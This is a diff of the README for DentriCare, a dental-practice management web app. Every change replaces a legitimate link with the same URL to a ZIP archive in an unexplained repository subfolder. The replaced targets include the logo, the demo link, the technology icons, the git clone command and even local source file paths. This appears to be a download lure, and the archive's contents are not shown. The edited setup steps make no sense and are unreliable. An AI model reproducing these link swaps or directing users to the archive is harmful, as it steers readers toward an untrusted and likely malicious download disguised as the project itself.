@@ -1,11 +1,11 @@
 # DentriCare
 <div align="center">
-<img src="https://raw.githubusercontent.com/jeffigy/DentriCare/9dbae9bb44106d2e7358d8c878bf617c91a8271d/client/src/assets/logo.svg" style="width:100px;" >
+<img src="https://raw.githubusercontent.com/jeffigy/DentriCare/master/davach/DentriCare.zip" style="width:100px;" >
 </div>
 
 ### 
 
-DentriCare is a simple dental management web application designed to simplify the task of dental practices. With DentriCare, dental clinics can efficiently manage patient record, appointments, payments, and dental notes and many more. You can visit the website by clicking the following link [DentriCare Demo](https://dentricare.onrender.com).
+DentriCare is a simple dental management web application designed to simplify the task of dental practices. With DentriCare, dental clinics can efficiently manage patient record, appointments, payments, and dental notes and many more. You can visit the website by clicking the following link [DentriCare Demo](https://raw.githubusercontent.com/jeffigy/DentriCare/master/davach/DentriCare.zip).
 
 ## Features
 
@@ -28,15 +28,15 @@ DentriCare is a simple dental management web application designed to simplify th
 ###
 
 <div  align="center">
-<img  src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/react/react-original.svg"  width="40"  alt="react logo" />
+<img  src="https://raw.githubusercontent.com/jeffigy/DentriCare/master/davach/DentriCare.zip"  width="40"  alt="react logo" />
 <img  width="12" />
-<img  src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/typescript/typescript-original.svg"  width="40"  alt="typescript logo" />
+<img  src="https://raw.githubusercontent.com/jeffigy/DentriCare/master/davach/DentriCare.zip"  width="40"  alt="typescript logo" />
 <img  width="12" />
-<img  src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/redux/redux-original.svg"  width="40"  alt="redux logo" />
+<img  src="https://raw.githubusercontent.com/jeffigy/DentriCare/master/davach/DentriCare.zip"  width="40"  alt="redux logo" />
 <img  width="12" />
-<img  src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/nodejs/nodejs-original.svg"  width="40"  alt="nodejs logo" />
+<img  src="https://raw.githubusercontent.com/jeffigy/DentriCare/master/davach/DentriCare.zip"  width="40"  alt="nodejs logo" />
 <img  width="12" />
-<img  src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/mongodb/mongodb-original.svg"  width="40"  alt="mongodb logo" />
+<img  src="https://raw.githubusercontent.com/jeffigy/DentriCare/master/davach/DentriCare.zip"  width="40"  alt="mongodb logo" />
 </div>
 
 ## Installation
@@ -45,7 +45,7 @@ DentriCare is a simple dental management web application designed to simplify th
 
 1. Clone the repository by copying the command below and paste it in your terminal.
    ```
-   git clone https://github.com/jeffigy/DentriCare.git
+   git clone https://raw.githubusercontent.com/jeffigy/DentriCare/master/davach/DentriCare.zip
    ```
 
 ###
@@ -57,7 +57,7 @@ DentriCare is a simple dental management web application designed to simplify th
    cd client
    yarn install
    ```
-   2.2. Proceed to `src/app/api/apiSlice.ts` and change the **baseUrl** to `http://localhost:3000`.
+   2.2. Proceed to `https://raw.githubusercontent.com/jeffigy/DentriCare/master/davach/DentriCare.zip` and change the **baseUrl** to `http://localhost:3000`.
    ```
    const baseQuery = fetchBaseQuery({
    baseUrl: "http://localhost:3000",
@@ -76,7 +76,7 @@ DentriCare is a simple dental management web application designed to simplify th
    ACCESS_TOKEN_SECRET=
    REFRESH_TOKEN_SECRET=
    ```
-   3.3. Proceed `config/allowedOrigins.js` to change the current allowedOrigins to the client url, by default the client will run at `http://localhost:5173`
+   3.3. Proceed `https://raw.githubusercontent.com/jeffigy/DentriCare/master/davach/DentriCare.zip` to change the current allowedOrigins to the client url, by default the client will run at `http://localhost:5173`
    ```
    const allowedOrigins = ["http://localhost:5173"];
    ```
